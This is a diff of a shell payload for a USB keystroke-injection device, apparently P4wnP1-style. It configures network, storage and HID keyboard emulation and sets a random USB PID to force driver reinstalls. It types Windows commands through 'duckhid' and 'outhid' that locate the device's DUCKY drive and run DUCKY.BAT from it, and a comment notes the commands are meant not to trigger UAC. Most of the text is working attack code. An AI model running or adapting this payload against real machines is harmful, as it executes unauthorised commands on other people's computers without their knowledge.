@@ -1,9 +1,17 @@
-USE_ECM=true
-USE_RNDIS=true
-USE_RAMDRIVE=true
-USE_HID=true
-HID_KEYBOARD_TEST=true
-lang="us"
+USE_ECM=true				# Mac and Linux NIC over USB
+USE_RNDIS=true				# Windows NIC over USB
+
+USE_RAMDRIVE=true			# Mount the USB storage drive
+
+USB_PID=$(printf "0x%04X" $RANDOM)	# Random PID to raise chance of driver reinstall
+USE_HID=true				# Needed for keyboard interface
+USE_HID_MOUSE=false			# if true HID mouse will be enabled
+USE_RAWHID=false			# if true a raw HID device will be enabled
+HID_KEYBOARD_TEST=true			# Waits for the keyboard driver to install
+
+lang="us"				# Language. Stick to US for, eh, U.S.
+
+led_blink 11 # 10 to 20 blinks the red LED.
 
 function onKeyboardUp()
 {
@@ -24,6 +32,8 @@ STRING @echo off
 ENTER
 EOF
 
+led_blink 12
+
 # We are switching to outhid because duckhid isn't being consistent on when it is and is not okay with special characters. asked
 # to call from terminal and it seems to work, but asked to be called from this file, and all of a sudden it doesn't work. Rage!!
 
@@ -31,6 +41,7 @@ EOF
 # label exists in the computer, this will break the script and cause chaos. You may want to change the label of your ducky drive
 # to something unique or specific to avoid conflicts, but that decision is entirely at your discretion. Try to avoid long labels
 # and try to avoid spaces. Using quotation marks should make spaces work, but findstr is very buggy, and likes to not work well.
+# The following codes should not be flagging UAC, but it depends on how paranoid the user has UAC set to. Your mileage may vary.
 (
 echo "wmic logicaldisk get deviceid, volumename | findstr \"DUCKY\" > \"%TEMP%\out.srp\"";
 echo "set /p DriveTemp= < \"%TEMP%\out.srp\"";
@@ -53,6 +64,9 @@ echo "if not \"%Drive%\" == \" \" %Drive%:\DUCKY.BAT") | outhid
 # To do: See if these snips of code support Linux variables and move drive name to var to clean up comments.
 # To do: See if Ducky USB drive has a static serial number that we might be able to use for mounting purposes.
 # To do: Git Gud.
+
+led_blink 13
+
 cat <<- EOF | duckhid
 STRING PAUSE
 ENTER
@@ -71,8 +85,13 @@ STRING COPY CON IPRange.srp
 ENTER
 EOF
 
-hostname -I | xargs -n1 > $wdir/RAMDrive/Out
-cat $wdir/RAMDrive/Out | outhid
+led_blink 1
+
+hostname -I | xargs -n1 > /tmp/out
+
+led_blink 14
+
+cat /tmp/out | outhid
 
 cat <<- EOF | duckhid
 CONTROL z
@@ -82,5 +101,7 @@ ENTER
 STRING MOUNTDUCK
 ENTER
 EOF
+
+led_blink 255
 
 }
